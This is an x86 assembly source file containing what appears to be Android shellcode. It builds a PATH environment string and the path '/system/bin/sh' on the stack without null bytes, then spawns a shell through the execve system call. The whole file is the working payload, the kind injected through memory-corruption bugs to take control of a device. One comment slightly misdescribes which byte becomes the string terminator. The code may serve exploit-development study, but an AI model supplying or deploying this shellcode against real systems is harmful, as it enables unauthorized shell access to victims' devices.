BITS 32
	
_start:
	;eax = 11			execve(filename,argv,envp);
	;ebx = filename	/system/bin/sh
	;ecx = argv[]		argv[0]=filename argv[1]=0
	;edx = envp[]		envp[0]=PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin envp[1]=0
	xor ecx, ecx
	xor eax,eax
	
	;"PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin\0"
	push ecx
	push 0x6e696278
	push 0x2f6d6574
	push 0x7379732f
	push 0x3a6e6962
	push 0x2f6d6574
	push 0x7379732f
	push 0x3a6e6962
	push 0x732f6d65
	push 0x74737973
	push 0x2f3a6e69
	push 0x622f726f
	push 0x646e6576
	push 0x2f3a6e69
	push 0x62732f3d
	push 0x48544150
	
	;edx={"PATH=/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin",0x0}
	mov edx, esp
	push ecx
	push edx
	mov edx, esp
	
	;"/system/bin/sh\0"
	push 0x410a6873
	push 0x2f6e6962
	push 0x2f6d6574
	push 0x7379732f
    mov [esp+14],cl ;0x41を終端文字に変更
    
    ;ebx="/system/bin/sh"
    mov ebx, esp
    
    ;ecx={"/system/bin/sh\0",0x0}
    push ecx
    push ebx
    mov ecx, esp
    
	;eax=11 int 0x80
    mov al, 11
    int 0x80
